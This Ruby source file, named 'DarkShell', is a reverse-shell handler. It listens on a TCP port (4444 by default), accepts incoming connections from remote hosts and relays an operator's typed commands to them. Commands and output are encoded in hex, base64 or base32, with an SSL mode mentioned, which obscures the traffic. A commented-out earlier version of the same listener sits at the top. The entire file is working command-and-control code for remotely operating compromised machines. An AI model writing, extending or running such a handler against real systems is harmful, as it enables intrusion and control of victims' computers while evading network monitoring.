#!/usr/bin/env ruby
require 'socket'
require 'rex'
require 'rex/socket'
require 'thread'
require 'base64'
require 'base32'

#
#ip = ARGV[0] || "0.0.0.0"
#port = ARGV[1] || 4444
#
#server = TCPServer.new(ip, port)
#puts "Starting listen #{ip}:#{port}"
#
#def hex_decode(str)
#  tmp_str = ""
#  str.split("\n").each{|string| string.gsub(/../) { |pair| tmp_str << pair.hex.chr }};
#
#  return tmp_str
#end
#
#def hex_encode(str)
#  str.chars.map{|x| x.ord.to_s(16)}.join
#end
#
#loop do
#  Thread.start(server.accept) do |client|
#    #puts "Received from #{client.addr.join(":")}"
#    puts "Received from #{client.remote_address.inspect_sockaddr}"
#    puts "Input is ready."
#    Thread.new do 
#      while true
#          #print ">>input:"
#          command = STDIN.gets.chomp 
#          cmd = hex_encode(command)
#          #puts cmd
#          client.puts(cmd)
#      end
#    end
#
#    while true
#
#      ready = IO.select([client], nil, nil, 10)
#      if ready
#        res =  client.recvfrom(40000000)[0].chomp
#        #puts res.inspect
#        puts hex_decode(res)
#      end
#
#    end
#
#    #client.close
#  end
#end


class DarkShell
  attr_accessor :ip
  attr_accessor :port

  def initialize(ip, port, en_type)
    @ip       = ip   || "0.0.0.0"
    @port     = port || "4444"
    @en_type  = en_type 
  end

  # The encryption type
  def type
    return @type if @type

    case @en_type.downcase
    when "hex"
      @type = "HEX"
    when "base64"
      @type = "BASE64"
    when "base32"
      @type = "BASE32"
    when "ssl"
      @type = "SSL"
    else
      raise "ERROR: unknow encrypt type"
    end

    @type
  end

  def hex_encode(str)
    str.chars.map{|x| x.ord.to_s(16)}.join
  end

  def hex_decode(str)
    tmp_str = ""
    str.split("\n").each{|string| string.gsub(/../) { |pair| tmp_str << pair.hex.chr }};

    return tmp_str
  end

  def base64_encode(str)
    Base64.encode64(str).chomp
  end

  def base64_decode(str)
    Base64.decode64(str)
  end

  def base32_encode(str)
    Base32.encode(str)
  end

  #
  # We have to handle the line break manually, 
  # cause the Base32.decode cannot parse it correctly.
  def base32_decode(str)
    Base32.decode(str.delete("\n"))
  end

  #
  # The encode function of shell
  #
  def encode(str)
    case type
    when "HEX"
      return hex_encode(str)
    when "BASE64"
      return base64_encode(str)
    when "BASE32"
      return base32_encode(str)
    when "SSL"
      # Done in class SslTcpServer
      return str
    end
  end


  #
  # The decode function of shell
  #
  def decode(str)
    case type
    when "HEX"
      return hex_decode(str)
    when "BASE64"
      return base64_decode(str)
    when "BASE32"
      return base32_decode(str)
    when "SSL"
      # Done in class SslTcpServer
      return str
    end
  end

  # Read from client socket
  def read_from(s)
    case type
    when "HEX", "BASE64", "BASE32"
      return s.recvfrom(40000000)[0].chomp
    when "SSL"
      # Done in class SslTcpServer
      return s.read
    end
  end

  # Write into client socket
  def write_into(s, command)
    case type
    when "HEX", "SSL", "BASE64", "BASE32"
      s.puts(command + "\n")
    end
  end

  def listen
    server = TCPServer.new(ip, port)
    puts "Encode type is '#{type}'"
    puts "Starting listen #{ip}:#{port}"

    loop do
      Thread.start(server.accept) do |client|
        puts "Received from #{client.remote_address.inspect_sockaddr}"
        puts "Input is ready."

        # Receive user input and send it to remote.
        Thread.new do 
          while true
              command = STDIN.gets.chomp 
              cmd = encode(command)
              # For debug
              #puts("Raw>>" + cmd) 
              write_into(client, cmd)
          end
        end

        # Handle incoming data and print it to stdout.
        while true
          ready = IO.select([client], nil, nil, 10)
          if ready
            res =  read_from(client)
            # For debug
            #puts("Raw<< " + res)
            print ">"
            puts decode(res)
          end

        end
      end
    end
  end
end


ip      = ARGV[0] || "0.0.0.0"
port    = ARGV[1] || 4444
en_type = ARGV[2] || "hex"

darkshell = DarkShell.new(ip, port, en_type)
darkshell.listen